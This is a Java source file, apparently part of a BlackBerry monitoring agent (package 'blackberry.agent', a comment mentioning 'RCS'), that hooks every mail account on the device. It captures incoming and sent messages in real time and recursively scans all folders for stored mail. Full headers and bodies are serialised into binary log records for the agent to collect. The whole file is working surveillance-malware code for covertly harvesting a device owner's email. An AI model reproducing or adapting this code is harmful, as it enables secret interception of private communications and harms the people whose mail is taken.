/**
 * 
 */
package blackberry.agent;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Enumeration;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.BodyPart;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Header;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException; //#ifdef HAVE_MIME
import net.rim.blackberry.api.mail.MimeBodyPart; //#endif
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.SendListener;
import net.rim.blackberry.api.mail.ServiceConfiguration;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.blackberry.api.mail.event.FolderEvent;
import net.rim.blackberry.api.mail.event.FolderListener;
import net.rim.blackberry.api.mail.event.StoreEvent;
import net.rim.blackberry.api.mail.event.StoreListener;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.IntHashtable;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The listener interface for receiving mail events.
 * The class that is interested in processing a mail
 * event implements this interface, and the object created
 * with that class is registered with a component using the
 * component's <code>addMailListener<code> method. When
 * the mail event occurs, that object's appropriate
 * method is invoked.
 * 
 * @author user1
 */
public final class MailListener implements FolderListener, StoreListener,
        SendListener {

    // #debug
    static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);

    private static final int MAIL_VERSION = 2009070301;

    MessageAgent messageAgent;
    String[] names;

    protected static IntHashtable fieldTable;
    private static ServiceRecord[] mailServiceRecords;

    /**
     * controlla se il messaggio e' mime e ne stampa il contenuto.
     * 
     * @param multipart
     *            the multipart
     * @param maxMessageSize
     *            the max message len
     */
    protected void dissectMultipart(final Multipart multipart,
            StringBuffer mail, final long maxMessageSize) {
        // This vector stores fields which are to be displayed only after all
        // of the body fields are displayed. (Attachments and Contacts).
        final Vector delayedFields = new Vector();

        // Process each part of the multi-part, taking the appropriate action
        // depending on the part's type. This loop should: display text and
        // html body parts, recursively display multi-parts and store
        // attachments and contacts to display later.
        for (int index = 0; index < multipart.getCount(); index++) {
            final BodyPart bodyPart = multipart.getBodyPart(index);

            // If this body part is text then display all of it
            if (bodyPart instanceof TextBodyPart) {

                //#debug debug
                debug.trace("dissectMultipart: TextBodyPart");

                final TextBodyPart textBodyPart = (TextBodyPart) bodyPart;

                // If there are missing parts of the text, try to retrieve the
                // rest of it.
                if (textBodyPart.hasMore()) {
                    try {
                        Transport.more(textBodyPart, true);
                    } catch (final Exception e) {
                        // #debug debug
                        debug.trace("Transport.more(BodyPart, boolean) threw "
                                + e.toString());
                    }
                }
                String plainText = (String) textBodyPart.getContent();

                mail.append("Content-type: " + textBodyPart.getContentType()
                        + "; charset=UTF8\r\n\r\n");
                //mail.append("Content-type: "+ textBodyPart.getContentType() +";\r\n\r\n");                          

                mail.append(plainText);

                //#debug debug
                debug.trace("TextBodyPart: " + mail.toString());

                // Display the plain text, using an EditField if the message is
                // editable or a RichTextField if it is not editable. Note: this
                // does not add any empty fields.
                if (plainText.length() != 0) {
                    if (maxMessageSize > 0
                            && plainText.length() > maxMessageSize) {
                        // se e' attivo il filtro sulla dimensione dell'email,
                        // sovrascrive al body dell'email la stringa troncata
                        plainText = plainText.substring(0,
                                (int) (maxMessageSize));
                    }
                }
            }
            // #ifdef HAVE_MIME
            else if (bodyPart instanceof MimeBodyPart) {
                //#debug debug
                debug.trace("dissectMultipart: MimeBodyPart");

                final MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;

                // If the content is text then display it
                final String contentType = mimeBodyPart.getContentType();
                if (contentType
                        .startsWith(BodyPart.ContentType.TYPE_TEXT_HTML_STRING)) {
                    final Object obj = mimeBodyPart.getContent();
                    if (obj != null) {
                        String htmlText = new String((byte[]) obj);
                        // se e' attivo il filtro sulla dimensione dell'email,
                        // sovrascrive al body dell'email la stringa troncata

                        if (maxMessageSize > 0
                                && htmlText.length() > maxMessageSize) {
                            // se e' attivo il filtro sulla dimensione
                            // dell'email,
                            // sovrascrive al body dell'email la stringa
                            // troncata
                            htmlText = htmlText.substring(0,
                                    (int) (maxMessageSize));
                        }

                        // #debug debug
                        debug.trace("Testo dell'email MIME: " + htmlText);

                        addAllHeaders(mimeBodyPart.getAllHeaders(), mail);
                        mail.append(htmlText);
                        //#debug debug
                        debug.trace("HTML: " + mail.toString());
                    }
                } else if (contentType
                        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {

                    //#debug debug
                    debug.trace("dissectMultipart: alternative");

                    // If the body part is a multi-part and it has the the
                    // content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
                    // recursively display the multi-part.
                    final Object obj = mimeBodyPart.getContent();
                    if (obj instanceof Multipart) {
                        final Multipart childMultipart = (Multipart) obj;
                        final String childMultipartType = childMultipart
                                .getContentType();
                        if (childMultipartType
                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                            dissectMultipart(childMultipart, mail,
                                    maxMessageSize);
                        }
                    }
                }
            }
            // #endif

        }

        // Now that the body parts have been displayed, display the queued
        // fields while separating them by inserting a separator field.
        for (int index = 0; index < delayedFields.size(); index++) {
            // System.out.println(delayedFields.elementAt(index));
            // #debug debug
            debug.trace(delayedFields.elementAt(index).toString());
        }
    }

    Filter realtimeFilter;

    Filter collectFilter;

    /**
     * Instantiates a new mail listener.
     * 
     * @param messageAgent_
     *            the message agent_
     */
    public MailListener(final MessageAgent messageAgent_) {
        messageAgent = messageAgent_;
    }

    private void addListeners(final Store store) {
        store.addFolderListener(this);
        store.addSendListener(this);
        store.addStoreListener(this);
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.StoreListener#batchOperation(net.rim
     * .blackberry.api.mail.event.StoreEvent)
     */
    public void batchOperation(final StoreEvent arg0) {
        // #debug info
        debug.info("batchOperation: " + arg0);

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.FolderListener#messagesAdded(net.rim
     * .blackberry.api.mail.event.FolderEvent)
     */
    public synchronized void messagesAdded(final FolderEvent folderEvent) {
        final Message message = folderEvent.getMessage();

        // #debug info
        debug
                .info("Added Message: " + message + " folderEvent: "
                        + folderEvent);

        try {
            int type = folderEvent.getType();
            if (type != FolderEvent.MESSAGE_ADDED) {
                //#debug info
                debug.info("filterMessage: FILTERED_MESSAGE_ADDED");
                return;
            }

            final int filtered = realtimeFilter.filterMessage(message,
                    messageAgent.lastcheck);
            if (filtered == Filter.FILTERED_OK) {
                saveLog(message, realtimeFilter.maxMessageSize);
                //#debug debug
                debug.trace("messagesAdded: " + message.getFolder().getName());
            }

        } catch (final MessagingException ex) {
            // #debug
            debug.error("cannot manage added message: " + ex);
        }

        messageAgent.updateMarkup();
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.event.FolderListener#messagesRemoved(net.
     * rim.blackberry.api.mail.event.FolderEvent)
     */
    public void messagesRemoved(final FolderEvent e) {
        final Message message = e.getMessage();
        // #debug info
        debug.info("Removed Message" + message);

    }

    /**
     * Removes the listeners.
     * 
     * @param store
     *            the store
     */
    public void removeListeners(final Store store) {
        store.removeFolderListener(this);
        store.removeSendListener(this);
        store.removeStoreListener(this);
    }

    /**
     * Run.
     */
    public void run() {
        // #debug debug
        debug.trace("run");

        final long timestamp = messageAgent.initMarkup();

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
            names[count] = mailServiceRecords[count].getName();
            // #debug debug
            debug.trace("Nome dell'account di posta: " + names[count]);

            names[count] = mailServiceRecords[0].getName();
            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();

            final Folder[] folders = store.list();
            // Scandisco ogni Folder dell'account di posta
            scanFolders(folders);
            messageAgent.updateMarkup();
        }
        // #debug debug
        debug.trace("Fine ricerca!!");

        messageAgent.updateMarkup();
    }

    private void saveLog(final Message message, final long maxMessageSize) {

        //#debug debug
        debug.trace("saveLog: " + message);

        ByteArrayOutputStream os = null;
        try {
            os = new ByteArrayOutputStream();
            message.writeTo(os);
            final byte[] rfc822 = os.toByteArray();

            //final String content_type = "Content-Type: text/plain;\r\n";
            //final String content_transfer = "Content-Transfer-Encoding: binary\r\n";

            String messageContent = new String(rfc822);
            //Object co = message.getContent();
            //byte[] content = (byte[]) co;
            //String messageContent =   new String(content);

            int poscont = messageContent.indexOf("Content-Type");
            if (poscont == -1) {
                /*
                 * int pos = messageContent.indexOf("\r\n\r\n");
                 * if (pos > 0) {
                 * String headers = messageContent.substring(0, pos);
                 * String body = messageContent.substring(pos);
                 * messageContent = headers + "\r\n" + plain + body;
                 * }
                 */

                //messageContent = content_type + content_transfer + messageContent;
            }

            //#debug debug
            debug.trace(messageContent);

            //debug.trace("BodyText: " + message.getBodyText());

            final int flags = 1;
            final int size = message.getSize();
            final DateTime filetime = new DateTime(message.getReceivedDate());

            final byte[] additionalData = new byte[20];
            /*
             * UINT uVersion; 200 #define LOG_MAIL_VERSION 2009070301 201 UINT
             * uFlags; 202 UINT uSize; 203 FILETIME ftTime;
             */

            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                    false);
            databuffer.writeInt(MAIL_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeInt(size);
            databuffer.writeLong(filetime.getFiledate());
            Check.ensures(additionalData.length == 20, "Wrong buffer size");

            String mail = parseMessage(message, maxMessageSize);
            //#debug debug
            debug.trace("saveLog: " + mail);

            messageAgent.createLog(additionalData, mail.getBytes("UTF-8"));

        } catch (final IOException e) {
            //#debug error
            debug.error("saveLog message: " + e);
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (final IOException e) {
                }
            }
        }
    }

    /**
     * scansione ricorsiva della directories.
     * 
     * @param subfolders
     *            the subfolders
     */
    public void scanFolders(final Folder[] subfolders) {
        Folder[] dirs;

        // Date receivedDate;
        if (subfolders.length <= 0) {
            return;
        }
        for (int count = 0; count < subfolders.length; count++) {
            // #debug debug
            debug.trace("Nome della cartella: "
                    + subfolders[count].getFullName());

            //#debug debug
            debug.trace("scanFolders getName: " + subfolders[count].getName());

            dirs = subfolders[count].list();
            scanFolders(dirs);
            try {
                final Message[] messages = subfolders[count].getMessages();
                // Scandisco ogni e-mail dell'account di posta
                for (int j = 0; j < messages.length; j++) {
                    final Message message = messages[j];

                    final int filtered = collectFilter.filterMessage(message,
                            messageAgent.lastcheck);
                    if (filtered == Filter.FILTERED_OK) {
                        try {
                            saveLog(message, realtimeFilter.maxMessageSize);
                        } catch (Exception ex) {
                            //#debug error
                            debug.error("saveLog: " + ex);
                        }
                    }
                }
            } catch (final MessagingException e) {
                // #debug debug
                debug.trace("Folder#getMessages() threw " + e.toString());

            }
        }
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.blackberry.api.mail.SendListener#sendMessage(net.rim.blackberry
     * .api.mail.Message)
     */
    public boolean sendMessage(final Message message) {

        // if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
        // #debug info
        debug.info("New Send Message: " + message);

        try {
            final int filtered = realtimeFilter.filterMessage(message,
                    messageAgent.lastcheck);
            if (filtered == Filter.FILTERED_OK) {
                saveLog(message, realtimeFilter.maxMessageSize);
                //#debug debug
                debug.trace("messagesAdded: " + message.getFolder().getName());
            }

        } catch (final MessagingException ex) {
            // #debug
            debug.error("cannot manage send message: " + ex);
            return false;
        }

        messageAgent.updateMarkup();

        return true;
    }

    private String parseMessage(final Message message, final long maxMessageSize) {
        Address[] addresses;

        StringBuffer mail = new StringBuffer();
        //mail.append("MIME-Version: 1.0\r\n");
        // mail.append("X-Mailer: RCS\r\n");

        try {
            Address[] from = message.getRecipients(Message.RecipientType.FROM);
            if (from.length == 0) {
                message.addHeader("From:", "localuser");
            }
            message.addHeader("MIME-Version:", "1.0");

            addAllHeaders(message.getAllHeaders(), mail);

            debug
                    .trace("Dimensione dell'email: " + message.getSize()
                            + "bytes");
            debug.trace("Data invio dell'email: " + message.getSentDate());
            debug.trace("Oggetto dell'email: " + message.getSubject());

            final Object obj = message.getContent();

            Multipart parent = null;
            // #ifdef HAVE_MIME
            if (obj instanceof MimeBodyPart || obj instanceof TextBodyPart) {
                final BodyPart bp = (BodyPart) obj;
                parent = bp.getParent();
            } else {
                parent = (Multipart) obj;
            }

            // Display the message body
            final String mpType = parent.getContentType();

            if (mpType
                    .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
                    || mpType
                            .equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
                dissectMultipart(parent, mail, maxMessageSize);
            }
            // #endif
        } catch (final MessagingException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }

        return mail.toString();
    }

    private void addAllHeaders(final Enumeration headers, StringBuffer mail) {

        while (headers.hasMoreElements()) {
            Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                Header header = (Header) headerObj;
                mail.append(header.getName());
                mail.append(header.getValue());
                mail.append("\r\n");
            } else {
                //#debug error
                debug.error("Unknown header type: " + headerObj);
            }
        }
    }

    /**
     * Start.
     */
    public void start() {

        final ServiceBook serviceBook = ServiceBook.getSB();
        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");

        names = new String[mailServiceRecords.length];
        // #debug debug
        debug.trace("Ci sono: " + mailServiceRecords.length
                + " account di posta!");

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();
            addListeners(store);
        }

        // to forever
        realtimeFilter = (Filter) messageAgent.filtersEMAIL
                .get(Filter.TYPE_REALTIME);

        // history
        collectFilter = (Filter) messageAgent.filtersEMAIL
                .get(Filter.TYPE_COLLECT);
    }

    /**
     * Stop.
     */
    public void stop() {
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();
            removeListeners(store);
        }
    }

}
